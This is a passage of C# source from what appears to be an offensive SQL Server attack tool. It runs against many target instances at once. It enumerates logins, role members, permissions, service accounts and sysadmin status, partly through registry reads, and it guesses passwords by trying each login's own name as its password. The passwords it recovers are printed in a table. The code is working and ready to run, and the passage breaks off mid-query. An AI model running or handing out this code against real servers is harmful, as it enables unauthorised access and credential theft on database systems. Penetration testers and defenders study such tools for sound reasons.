                            // Setup connection string
                            string ConnectionString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");

                            // Run query
                            SqlConnection conn = new SqlConnection(ConnectionString);
                            SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
                            conn.Open();

                            // Read data into data table
                            DataTable dt = new DataTable();
                            SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
                            da.Fill(dt);

                            // Increase counter
                            linkCount = linkCount + 1;
                        }
                        catch (SqlException ex)
                        {
                            Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
                            if (VerboseG)
                            {
                                Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                            }
                        }
                    }
                    Console.WriteLine("\n" + linkCount + " attempts made using xp_fileexist.");
                }
                else
                {
                    Console.WriteLine("\nNo target instances have been defined.");
                }
                return null;
            }

            // ------------------------------------------------------------
            // FUNCTION: LISTPROLEMEMBER
            // ------------------------------------------------------------
            public static string ListRoleMembers()
            {
                CheckQueryReady();
                if (ReadyforQueryG)
                {
                    // Create data table 
                    IList<string> TargetList = new List<string>();

                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/	
                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/
                    DataView AccessView = new DataView(EvilCommands.MasterAccessList);
                    DataTable distinctValues = AccessView.ToTable(true, "Instance");
                    if (InstanceAllG)
                    {
                        foreach (DataRow CurrentRecord in distinctValues.Select())
                        {
                            TargetList.Add(CurrentRecord["Instance"].ToString());
                        }
                    }

                    // Add instance
                    if (!InstanceG.Equals(""))
                    {
                        TargetList.Add(InstanceG);
                    }

                    // Get list count
                    var count = TargetList.Count;
                    int roleCount = 0;
                    Console.WriteLine("\n" + count + " instances will be targeted.");

                    // Loop through target list 
                    foreach (var instance in TargetList)
                    {
                        Console.WriteLine("\n" + instance + ": ATTEMPTING QUERY");
                        try
                        {
                            // Setup connection string
                            string ConnectionString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");

                            // Execute query							
                            string fullcommand = @"
							    SELECT  @@Servername as [ComputerName],
							    @@SERVICENAME as [Instance],
							    SUSER_NAME(role_principal_id) as [RolePrincipalName],
							    member_principal_id as [PrincipalId],
							    SUSER_NAME(member_principal_id) as [PrincipalName]
							    FROM sys.server_role_members";

                            SqlConnection conn = new SqlConnection(ConnectionString);
                            SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
                            conn.Open();

                            // Read data into data table
                            DataTable dt = new DataTable();
                            SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
                            da.Fill(dt);

                            foreach (DataRow CurrentRecord in dt.Select())
                            {

                                // Display SQL Server information
                                Console.WriteLine("\nComputer Name       : " + CurrentRecord["ComputerName"].ToString());
                                Console.WriteLine("Instance            : " + CurrentRecord["Instance"].ToString());
                                Console.WriteLine("RolePrincipalName   : " + CurrentRecord["RolePrincipalName"].ToString());
                                Console.WriteLine("PrincipalId         : " + CurrentRecord["PrincipalId"].ToString());
                                Console.WriteLine("PrincipalName       : " + CurrentRecord["PrincipalName"].ToString());

                                // Increase counter
                                roleCount = roleCount + 1;
                            }
                        }
                        catch (SqlException ex)
                        {
                            Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
                            if (VerboseG)
                            {
                                Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                            }
                        }
                    }
                    Console.WriteLine("\n" + roleCount + " server role members were found.");
                }
                else
                {
                    Console.WriteLine("\nNo target instances have been defined.");
                }
                return null;
            }

            // ------------------------------------------------------------
            // FUNCTION: LISTPRIVS
            // ------------------------------------------------------------
            public static string ListPrivs()
            {
                CheckQueryReady();
                if (ReadyforQueryG)
                {
                    // Create data table 
                    IList<string> TargetList = new List<string>();

                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/	
                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/
                    DataView AccessView = new DataView(EvilCommands.MasterAccessList);
                    DataTable distinctValues = AccessView.ToTable(true, "Instance");
                    if (InstanceAllG)
                    {
                        foreach (DataRow CurrentRecord in distinctValues.Select())
                        {
                            TargetList.Add(CurrentRecord["Instance"].ToString());
                        }
                    }

                    // Add instance
                    if (!InstanceG.Equals(""))
                    {
                        TargetList.Add(InstanceG);
                    }

                    // Get list count
                    var count = TargetList.Count;
                    int linkCount = 0;
                    Console.WriteLine("\n" + count + " instances will be targeted.");

                    // Loop through target list 
                    foreach (var instance in TargetList)
                    {
                        Console.WriteLine("\n" + instance + ": ATTEMPTING QUERY");
                        try
                        {
                            // Setup connection string
                            string ConnectionString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");

                            // Execute query							
                            string fullcommand = @"
							    SELECT  @@Servername as [ComputerName],
							    @@SERVICENAME as [Instance],
							    GRE.name as [GranteeName],
							    GRO.name as [GrantorName],
							    PER.class_desc as [PermissionClass],
							    PER.permission_name as [PermissionName],
							    PER.state_desc as [PermissionState],
							    COALESCE(PRC.name, EP.name, N'') as [ObjectName],
							    COALESCE(PRC.type_desc, EP.type_desc, N'') as [ObjectType]
							    FROM [sys].[server_permissions] as PER
							    INNER JOIN sys.server_principals as GRO
							    ON PER.grantor_principal_id = GRO.principal_id
							    INNER JOIN sys.server_principals as GRE
							    ON PER.grantee_principal_id = GRE.principal_id
							    LEFT JOIN sys.server_principals as PRC
							    ON PER.class = 101 AND PER.major_id = PRC.principal_id
							    LEFT JOIN sys.endpoints AS EP
							    ON PER.class = 105 AND PER.major_id = EP.endpoint_id";

                            SqlConnection conn = new SqlConnection(ConnectionString);
                            SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
                            conn.Open();

                            // Read data into data table
                            DataTable dt = new DataTable();
                            SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
                            da.Fill(dt);

                            foreach (DataRow CurrentRecord in dt.Select())
                            {

                                // Display SQL Server information
                                Console.WriteLine("\nComputer Name     : " + CurrentRecord["ComputerName"].ToString());
                                Console.WriteLine("Instance          : " + CurrentRecord["Instance"].ToString());
                                Console.WriteLine("GranteeName       : " + CurrentRecord["GranteeName"].ToString());
                                Console.WriteLine("GrantorName       : " + CurrentRecord["GrantorName"].ToString());
                                Console.WriteLine("PermissionClass   : " + CurrentRecord["PermissionClass"].ToString());
                                Console.WriteLine("PermissionName    : " + CurrentRecord["PermissionName"].ToString());
                                Console.WriteLine("PermissionState   : " + CurrentRecord["PermissionState"].ToString());
                                Console.WriteLine("ObjectName        : " + CurrentRecord["ObjectName"].ToString());
                                Console.WriteLine("ObjectType        : " + CurrentRecord["ObjectType"].ToString());

                                // Increase counter
                                linkCount = linkCount + 1;
                            }
                        }
                        catch (SqlException ex)
                        {
                            Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
                            if (VerboseG)
                            {
                                Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                            }
                        }
                    }
                    Console.WriteLine("\n" + linkCount + " server privileges were found.");
                }
                else
                {
                    Console.WriteLine("\nNo target instances have been defined.");
                }
                return null;
            }

            // ------------------------------------------------------------
            // FUNCTION: LISTSERVERINFO
            // ------------------------------------------------------------
            public static string ListServerInfo()
            {
                CheckQueryReady();
                if (ReadyforQueryG)
                {
                    // Create data table 
                    IList<string> TargetList = new List<string>();

                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/									   
                    DataView AccessView = new DataView(EvilCommands.MasterAccessList);
                    DataTable distinctValues = AccessView.ToTable(true, "Instance");
                    if (InstanceAllG)
                    {
                        foreach (DataRow CurrentRecord in distinctValues.Select())
                        {
                            TargetList.Add(CurrentRecord["Instance"].ToString());
                        }
                    }

                    // Add instance
                    if (!InstanceG.Equals(""))
                    {
                        TargetList.Add(InstanceG);
                    }

                    // Get list count
                    var count = TargetList.Count;
                    int countAccessible = 0;
                    Console.WriteLine("\n" + count + " instances will be targeted.");

                    // Loop through target list 
                    foreach (var instance in TargetList)
                    {
                        Console.WriteLine("\n" + instance + ": ATTEMPTING QUERY");
                        try
                        {
                            // Setup connection string
                            string ConnectionString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");

                            // Execute query							
                            string fullcommand = @"
							    -- Get SQL Server Information

							    -- Get SQL Server Service Name and Path
							    DECLARE @SQLServerInstance varchar(250)
							    DECLARE @SQLServerServiceName varchar(250)
							    if @@SERVICENAME = 'MSSQLSERVER'
							    BEGIN
							    set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
							    set @SQLServerServiceName = 'MSSQLSERVER'
							    END
							    ELSE
							    BEGIN
							    set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))
							    set @SQLServerServiceName = 'MSSQL$'+cast(@@SERVICENAME as varchar(250))
							    END

							    -- Get SQL Server Service Account
							    DECLARE @ServiceaccountName varchar(250)
							    EXECUTE master.dbo.xp_instance_regread
							    N'HKEY_LOCAL_MACHINE', @SQLServerInstance,
							    N'ObjectName',@ServiceAccountName OUTPUT, N'no_output'

							    -- Get authentication mode
							    DECLARE @AuthenticationMode INT
							    EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
							    N'Software\Microsoft\MSSQLServer\MSSQLServer',
							    N'LoginMode', @AuthenticationMode OUTPUT

							    -- Get the forced encryption flag
							    BEGIN TRY 
								    DECLARE @ForcedEncryption INT
								    EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
								    N'SOFTWARE\MICROSOFT\Microsoft SQL Server\MSSQLServer\SuperSocketNetLib',
								    N'ForceEncryption', @ForcedEncryption OUTPUT
							    END TRY
							    BEGIN CATCH	            
							    END CATCH

							    -- Return server and version information
							    SELECT  @@servername as [Instance],
							    DEFAULT_DOMAIN() as [DomainName],
							    SERVERPROPERTY('processid') as ServiceProcessID,
							    @SQLServerServiceName as [ServiceName],
							    @ServiceAccountName as [ServiceAccount],
							    (SELECT CASE @AuthenticationMode
							    WHEN 1 THEN 'Windows Authentication'
							    WHEN 2 THEN 'Windows and SQL Server Authentication'
							    ELSE 'Unknown'
							    END) as [AuthenticationMode],
							    @ForcedEncryption as ForcedEncryption,
							    CASE  SERVERPROPERTY('IsClustered')
							    WHEN 0
							    THEN 'No'
							    ELSE 'Yes'
							    END as [Clustered],
							    SERVERPROPERTY('productversion') as [SQLServerVersionNumber],
							    SUBSTRING(@@VERSION, CHARINDEX('2', @@VERSION), 4) as [SQLServerMajorVersion],
							    serverproperty('Edition') as [SQLServerEdition],
							    SERVERPROPERTY('ProductLevel') AS [SQLServerServicePack],
							    SUBSTRING(@@VERSION, CHARINDEX('x', @@VERSION), 3) as [OSArchitecture],
							    RIGHT(SUBSTRING(@@VERSION, CHARINDEX('Windows NT', @@VERSION), 14), 3) as [OsVersionNumber],
							    SYSTEM_USER as [Currentlogin],
							    (select IS_SRVROLEMEMBER('sysadmin')) as IsSysadmin";

                            SqlConnection conn = new SqlConnection(ConnectionString);
                            SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
                            conn.Open();

                            // Read data into data table
                            DataTable dt = new DataTable();
                            SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
                            da.Fill(dt);

                            foreach (DataRow CurrentRecord in dt.Select())
                            {

                                // Display SQL Server information
                                Console.WriteLine("\nInstance             : " + CurrentRecord["Instance"].ToString());
                                Console.WriteLine("Domain               : " + CurrentRecord["DomainName"].ToString());
                                Console.WriteLine("Service PID          : " + CurrentRecord["ServiceProcessID"].ToString());
                                Console.WriteLine("Service Name         : " + CurrentRecord["ServiceName"].ToString());
                                Console.WriteLine("Service Account      : " + CurrentRecord["ServiceAccount"].ToString());
                                Console.WriteLine("Authentication Mode  : " + CurrentRecord["AuthenticationMode"].ToString());
                                Console.WriteLine("Forced Encryption    : " + CurrentRecord["ForcedEncryption"].ToString());
                                Console.WriteLine("Clustered            : " + CurrentRecord["Clustered"].ToString());
                                Console.WriteLine("SQL Version          : " + CurrentRecord["SQLServerMajorVersion"].ToString());
                                Console.WriteLine("SQL Version Number   : " + CurrentRecord["SQLServerVersionNumber"].ToString());
                                Console.WriteLine("SQL Edition          : " + CurrentRecord["SQLServerEdition"].ToString());
                                Console.WriteLine("SQL Service Pack     : " + CurrentRecord["SQLServerServicePack"].ToString());
                                Console.WriteLine("OS Architecture      : " + CurrentRecord["OSArchitecture"].ToString());
                                Console.WriteLine("OS Version Number    : " + CurrentRecord["OsVersionNumber"].ToString());
                                Console.WriteLine("Login                : " + CurrentRecord["CurrentLogin"].ToString());
                                Console.WriteLine("Login is Sysadmin    : " + CurrentRecord["IsSysadmin"].ToString());

                                // Add to count
                                countAccessible = countAccessible + 1;
                            }
                        }
                        catch (SqlException ex)
                        {
                            Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
                            if (VerboseG)
                            {
                                Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                            }
                        }
                    }
                    Console.WriteLine("\n" + countAccessible + " servers provided information.");
                }
                else
                {
                    Console.WriteLine("\nNo target instances have been defined.");
                }
                return null;
            }

            // ------------------------------------------------------------
            // FUNCTION: SHOWDISCOVERED
            // ------------------------------------------------------------
            public static string ShowDiscovered()
            {
                // Display output of data table
                int linewidth = 50;
                string columnValue = "";
                string spaces = "";
                int tabNumber = 1;
                DataRow[] currentRows = EvilCommands.MasterDiscoveredList.Select(null, null, DataViewRowState.CurrentRows);
                if (currentRows.Length > 1)
                {
                    // Display columns.
                    Console.WriteLine("\n");
                    foreach (DataColumn column in EvilCommands.MasterDiscoveredList.Columns)
                    {
                        // Pad column
                        columnValue = column.ColumnName.ToString();
                        if (columnValue.Length < linewidth)
                        {
                            tabNumber = linewidth - columnValue.Length;
                            spaces = new String(' ', tabNumber);
                        }
                        else
                        {
                            tabNumber = 1;
                        }

                        Console.Write(column.ColumnName + spaces);
                    }

                    Console.WriteLine("\t");

                    // Display rows
                    foreach (DataRow row in currentRows)
                    {
                        foreach (DataColumn column in EvilCommands.MasterDiscoveredList.Columns)
                        {
                            // Pad column to 50 characters
                            columnValue = row[column].ToString();
                            if (columnValue.Length < linewidth)
                            {
                                tabNumber = linewidth - columnValue.Length;
                                spaces = new String(' ', tabNumber);
                            }
                            else
                            {
                                tabNumber = 1;
                            }

                            Console.Write(row[column] + spaces);
                        }
                        Console.WriteLine("\t");
                    }                    
                }

                Console.WriteLine("\n" + EvilCommands.MasterDiscoveredList.Rows.Count + " instances found.");
                return null;
            }

            // ------------------------------------------------------------
            // FUNCTION: SHOWACCESS
            // ------------------------------------------------------------
            public static string ShowAccess()
            {
                // Unique the list
                DataView AccessView = new DataView(EvilCommands.MasterAccessList);
                DataTable distinctValues = AccessView.ToTable(true, "Instance", "DomainName", "ServiceProcessID", "ServiceName", "ServiceAccount", "AuthenticationMode", "ForcedEncryption", "Clustered", "SQLServerMajorVersion", "SQLServerVersionNumber", "SQLServerEdition", "SQLServerServicePack", "OSArchitecture", "OsVersionNumber", "CurrentLogin", "CurrentLoginPassword", "IsSysadmin");

                // Display the list 
                foreach (DataRow CurrentRecord in distinctValues.Select())
                {

                    // Display SQL Server information
                    Console.WriteLine("\nInstance             : " + CurrentRecord["Instance"].ToString());
                    Console.WriteLine("Domain               : " + CurrentRecord["DomainName"].ToString());
                    Console.WriteLine("Service PID          : " + CurrentRecord["ServiceProcessID"].ToString());
                    Console.WriteLine("Service Name         : " + CurrentRecord["ServiceName"].ToString());
                    Console.WriteLine("Service Account      : " + CurrentRecord["ServiceAccount"].ToString());
                    Console.WriteLine("Authentication Mode  : " + CurrentRecord["AuthenticationMode"].ToString());
                    Console.WriteLine("Forced Encryption    : " + CurrentRecord["ForcedEncryption"].ToString());
                    Console.WriteLine("Clustered            : " + CurrentRecord["Clustered"].ToString());
                    Console.WriteLine("SQL Version          : " + CurrentRecord["SQLServerMajorVersion"].ToString());
                    Console.WriteLine("SQL Version Number   : " + CurrentRecord["SQLServerVersionNumber"].ToString());
                    Console.WriteLine("SQL Edition          : " + CurrentRecord["SQLServerEdition"].ToString());
                    Console.WriteLine("SQL Service Pack     : " + CurrentRecord["SQLServerServicePack"].ToString());
                    Console.WriteLine("OS Architecture      : " + CurrentRecord["OSArchitecture"].ToString());
                    Console.WriteLine("OS Version Number    : " + CurrentRecord["OsVersionNumber"].ToString());
                    Console.WriteLine("Login                : " + CurrentRecord["CurrentLogin"].ToString());
                    Console.WriteLine("Password             : " + CurrentRecord["CurrentLoginPassword"].ToString());
                    Console.WriteLine("Login is Sysadmin    : " + CurrentRecord["IsSysadmin"].ToString());
                }

                // Display count
                int accessCount = distinctValues.Rows.Count;
                Console.Write("\n" + accessCount + " instances can be logged into.\n");

                return null;
            }

            // ------------------------------------------------------------
            // FUNCTION: CHECKLOGINASPW
            // ------------------------------------------------------------
            public static string CheckLoginAsPw()
            {
                CheckQueryReady();
                if (ReadyforQueryG)
                {
                    // Create data table 
                    IList<string> TargetList = new List<string>();

                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/
                    DataView AccessView = new DataView(EvilCommands.MasterAccessList);
                    DataTable distinctValues = AccessView.ToTable(true, "Instance");
                    if (InstanceAllG)
                    {
                        foreach (DataRow CurrentRecord in distinctValues.Select())
                        {
                            TargetList.Add(CurrentRecord["Instance"].ToString());
                        }
                    }

                    // Add instance
                    if (!InstanceG.Equals(""))
                    {
                        TargetList.Add(InstanceG);
                    }

                    // Get list count
                    var count = TargetList.Count;
                    int loginCount = 0;
                    Console.WriteLine("\n" + count + " instances will be targeted.");

                    // Loop through target list 
                    foreach (var instance in TargetList)
                    {
                        Console.WriteLine("\n" + instance + ": ATTEMPTING QUERY");

                        // Get logins for instance 
                        try
                        {
                            // Setup connection string
                            string ConnectionString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");

                            // Execute query							
                            string fullcommand = @"
							    SELECT @@SERVERNAME as [ComputerName],
							    @@SERVICENAME as [Instance],
							    n [PrincipalId], SUSER_NAME(n) as [PrincipalName]
							    from ( 
							    select top 500 row_number() over(order by t1.number) as N
							    from   master..spt_values t1 
								       cross join master..spt_values t2
							    ) a
							    where SUSER_NAME(n) is not null";

                            SqlConnection conn = new SqlConnection(ConnectionString);
                            SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
                            conn.Open();

                            // Read data into data table
                            DataTable logins = new DataTable();
                            SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
                            da.Fill(logins);

                            // Check login user as password for instance 
                            foreach (DataRow CurrentRecord in logins.Select())
                            {
                                // Test login as password										
                                DataTable Databases = new DataTable();
                                try
                                {

                                    // Define connection string 
                                    string ConnectionStringLogin = CreateConnectionString(instance, CurrentRecord["PrincipalName"].ToString(), CurrentRecord["PrincipalName"].ToString(), "SqlLogin", "master");

                                    // Define server info query
                                    string ServerInfoQuery = @"
									    -- Get SQL Server Information

									    -- Get SQL Server Service Name and Path
									    DECLARE @SQLServerInstance varchar(250)
									    DECLARE @SQLServerServiceName varchar(250)
									    if @@SERVICENAME = 'MSSQLSERVER'
									    BEGIN
									    set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
									    set @SQLServerServiceName = 'MSSQLSERVER'
									    END
									    ELSE
									    BEGIN
									    set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))
									    set @SQLServerServiceName = 'MSSQL$'+cast(@@SERVICENAME as varchar(250))
									    END

									    -- Get SQL Server Service Account
									    DECLARE @ServiceaccountName varchar(250)
									    EXECUTE master.dbo.xp_instance_regread
									    N'HKEY_LOCAL_MACHINE', @SQLServerInstance,
									    N'ObjectName',@ServiceAccountName OUTPUT, N'no_output'

									    -- Get authentication mode
									    DECLARE @AuthenticationMode INT
									    EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
									    N'Software\Microsoft\MSSQLServer\MSSQLServer',
									    N'LoginMode', @AuthenticationMode OUTPUT

									    -- Get the forced encryption flag
									    BEGIN TRY 
										    DECLARE @ForcedEncryption INT
										    EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
										    N'SOFTWARE\MICROSOFT\Microsoft SQL Server\MSSQLServer\SuperSocketNetLib',
										    N'ForceEncryption', @ForcedEncryption OUTPUT
									    END TRY
									    BEGIN CATCH	            
									    END CATCH

									    -- Return server and version information
									    SELECT  @@servername as [Instance],
									    DEFAULT_DOMAIN() as [DomainName],
									    SERVERPROPERTY('processid') as ServiceProcessID,
									    @SQLServerServiceName as [ServiceName],
									    @ServiceAccountName as [ServiceAccount],
									    (SELECT CASE @AuthenticationMode
									    WHEN 1 THEN 'Windows Authentication'
									    WHEN 2 THEN 'Windows and SQL Server Authentication'
									    ELSE 'Unknown'
									    END) as [AuthenticationMode],
									    @ForcedEncryption as ForcedEncryption,
									    CASE  SERVERPROPERTY('IsClustered')
									    WHEN 0
									    THEN 'No'
									    ELSE 'Yes'
									    END as [Clustered],
									    SERVERPROPERTY('productversion') as [SQLServerVersionNumber],
									    SUBSTRING(@@VERSION, CHARINDEX('2', @@VERSION), 4) as [SQLServerMajorVersion],
									    serverproperty('Edition') as [SQLServerEdition],
									    SERVERPROPERTY('ProductLevel') AS [SQLServerServicePack],
									    SUBSTRING(@@VERSION, CHARINDEX('x', @@VERSION), 3) as [OSArchitecture],
									    RIGHT(SUBSTRING(@@VERSION, CHARINDEX('Windows NT', @@VERSION), 14), 3) as [OsVersionNumber],
									    SYSTEM_USER as [Currentlogin],
									    (select IS_SRVROLEMEMBER('sysadmin')) as IsSysadmin";

                                    // Attmept connection and grab the server information
                                    SqlConnection connLogin = new SqlConnection(ConnectionStringLogin);
                                    SqlCommand DbQueryOutput = new SqlCommand(ServerInfoQuery, connLogin);
                                    connLogin.Open();

                                    // Read data into table 
                                    DataTable LoginInfo = new DataTable();
                                    SqlDataAdapter dalogin = new SqlDataAdapter(DbQueryOutput);
                                    dalogin.Fill(LoginInfo);
                                    connLogin.Close();

                                    // Increase counter
                                    loginCount = loginCount + 1;

                                    // List status
                                    Console.WriteLine("Instance:" + instance + " Login:" + CurrentRecord["PrincipalName"].ToString() + ": LOGIN SUCCESS");

                                    // Add to access list
                                    foreach (DataRow CurrentRow in LoginInfo.Select())
                                    {
                                        EvilCommands.MasterAccessList.Rows.Add(CurrentRow["Instance"].ToString(), CurrentRow["DomainName"].ToString(), CurrentRow["ServiceProcessID"].ToString(), CurrentRow["ServiceName"].ToString(), CurrentRow["ServiceAccount"].ToString(), CurrentRow["AuthenticationMode"].ToString(), CurrentRow["ForcedEncryption"].ToString(), CurrentRow["Clustered"].ToString(), CurrentRow["SQLServerMajorVersion"].ToString(), CurrentRow["SQLServerVersionNumber"].ToString(), CurrentRow["SQLServerEdition"].ToString(), CurrentRow["SQLServerServicePack"].ToString(), CurrentRow["OSArchitecture"].ToString(), CurrentRow["OsVersionNumber"].ToString(), CurrentRow["Currentlogin"].ToString(), CurrentRow["IsSysadmin"].ToString(), CurrentRow["Currentlogin"].ToString());
                                    }

                                }
                                catch
                                {
                                    Console.WriteLine("Instance:" + instance + " Login:" + CurrentRecord["PrincipalName"].ToString() + ": LOGIN FAILED");
                                }
                            }
                        }
                        catch (SqlException ex)
                        {
                            Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
                            if (VerboseG)
                            {
                                Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                            }
                        }
                    }
                    Console.WriteLine("\n" + loginCount + " logins were found that use the login name as the password.");
                }
                else
                {
                    Console.WriteLine("\nNo target instances have been defined.");
                }
                return null;
            }

            // ------------------------------------------------------------
            // FUNCTION: LISTLOGINS
            // ------------------------------------------------------------	
            public static string ListLogins()
            {
                CheckQueryReady();
                if (ReadyforQueryG)
                {
                    // Create data table 
                    IList<string> TargetList = new List<string>();

                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/
                    DataView AccessView = new DataView(EvilCommands.MasterAccessList);
                    DataTable distinctValues = AccessView.ToTable(true, "Instance");
                    if (InstanceAllG)
                    {
                        foreach (DataRow CurrentRecord in distinctValues.Select())
                        {
                            TargetList.Add(CurrentRecord["Instance"].ToString());
                        }
                    }

                    // Add instance
                    if (!InstanceG.Equals(""))
                    {
                        TargetList.Add(InstanceG);
                    }

                    // Get list count
                    var count = TargetList.Count;
                    int loginCount = 0;
                    Console.WriteLine("\n" + count + " instances will be targeted.");

                    // Loop through target list 
                    foreach (var instance in TargetList)
                    {
                        Console.WriteLine("\n" + instance + ": ATTEMPTING QUERY");
                        try
                        {
                            // Setup connection string
                            string ConnectionString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");

                            // Execute query							
                            string fullcommand = @"
							    SELECT @@SERVERNAME as [ComputerName],
							    @@SERVICENAME as [Instance],
							    n [PrincipalId], SUSER_NAME(n) as [PrincipalName]
							    from ( 
							    select top 500 row_number() over(order by t1.number) as N
							    from   master..spt_values t1 
								       cross join master..spt_values t2
							    ) a
							    where SUSER_NAME(n) is not null";

                            SqlConnection conn = new SqlConnection(ConnectionString);
                            SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
                            conn.Open();

                            // Read data into data table
                            DataTable dt = new DataTable();
                            SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
                            da.Fill(dt);

                            foreach (DataRow CurrentRecord in dt.Select())
                            {

                                // Display SQL Server information
                                Console.WriteLine("\nComputer Name     : " + CurrentRecord["ComputerName"].ToString());
                                Console.WriteLine("Instance          : " + CurrentRecord["Instance"].ToString());
                                Console.WriteLine("Principal Id      : " + CurrentRecord["PrincipalId"].ToString());
                                Console.WriteLine("Principal Name    : " + CurrentRecord["PrincipalName"].ToString());

                                // Increase counter
                                loginCount = loginCount + 1;
                            }
                        }
                        catch (SqlException ex)
                        {
                            Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
                            if (VerboseG)
                            {
                                Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                            }
                        }
                    }
                    Console.WriteLine("\n" + loginCount + " logins and/or roles where found.");
                }
                else
                {
                    Console.WriteLine("\nNo target instances have been defined.");
                }
                return null;
            }

            // ------------------------------------------------------------
            // FUNCTION: CHECKACCESS 
            // ------------------------------------------------------------
            public static string CheckAccess()
            {
                CheckQueryReady();
                if (ReadyforQueryG)
                {
                    // Create data table 
                    IList<string> TargetList = new List<string>();

                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/									   
                    if (InstanceAllG)
                    {
                        foreach (DataRow CurrentRecord in EvilCommands.MasterDiscoveredList.Select())
                        {
                            TargetList.Add(CurrentRecord["Instance"].ToString());
                        }
                    }

                    // Add instance
                    if (!InstanceG.Equals(""))
                    {
                        TargetList.Add(InstanceG);
                    }

                    // Get list count
                    var count = EvilCommands.MasterDiscoveredList.Rows.Count;
                    int countAccessible = 0;
                    Console.WriteLine("\n" + count + " instances will be targeted.");

                    // Loop through target list 
                    foreach (var instance in TargetList)
                    {
                        Console.WriteLine("\n" + instance + ": ATTEMPTING QUERY");
                        try
                        {
                            // Setup connection string
                            string ConnectionString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");

                            // Execute query							
                            string fullcommand = @"
							    -- Get SQL Server Information

							    -- Get SQL Server Service Name and Path
							    DECLARE @SQLServerInstance varchar(250)
							    DECLARE @SQLServerServiceName varchar(250)
							    if @@SERVICENAME = 'MSSQLSERVER'
							    BEGIN
							    set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
							    set @SQLServerServiceName = 'MSSQLSERVER'
							    END
							    ELSE
							    BEGIN
							    set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))
							    set @SQLServerServiceName = 'MSSQL$'+cast(@@SERVICENAME as varchar(250))
							    END

							    -- Get SQL Server Service Account
							    DECLARE @ServiceaccountName varchar(250)
							    EXECUTE master.dbo.xp_instance_regread
							    N'HKEY_LOCAL_MACHINE', @SQLServerInstance,
							    N'ObjectName',@ServiceAccountName OUTPUT, N'no_output'

							    -- Get authentication mode
							    DECLARE @AuthenticationMode INT
							    EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
							    N'Software\Microsoft\MSSQLServer\MSSQLServer',
							    N'LoginMode', @AuthenticationMode OUTPUT

							    -- Get the forced encryption flag
							    BEGIN TRY 
								    DECLARE @ForcedEncryption INT
								    EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
								    N'SOFTWARE\MICROSOFT\Microsoft SQL Server\MSSQLServer\SuperSocketNetLib',
								    N'ForceEncryption', @ForcedEncryption OUTPUT
							    END TRY
							    BEGIN CATCH	            
							    END CATCH

							    -- Return server and version information
							    SELECT  @@servername as [Instance],
							    DEFAULT_DOMAIN() as [DomainName],
							    SERVERPROPERTY('processid') as ServiceProcessID,
							    @SQLServerServiceName as [ServiceName],
							    @ServiceAccountName as [ServiceAccount],
							    (SELECT CASE @AuthenticationMode
							    WHEN 1 THEN 'Windows Authentication'
							    WHEN 2 THEN 'Windows and SQL Server Authentication'
							    ELSE 'Unknown'
							    END) as [AuthenticationMode],
							    @ForcedEncryption as ForcedEncryption,
							    CASE  SERVERPROPERTY('IsClustered')
							    WHEN 0
							    THEN 'No'
							    ELSE 'Yes'
							    END as [Clustered],
							    SERVERPROPERTY('productversion') as [SQLServerVersionNumber],
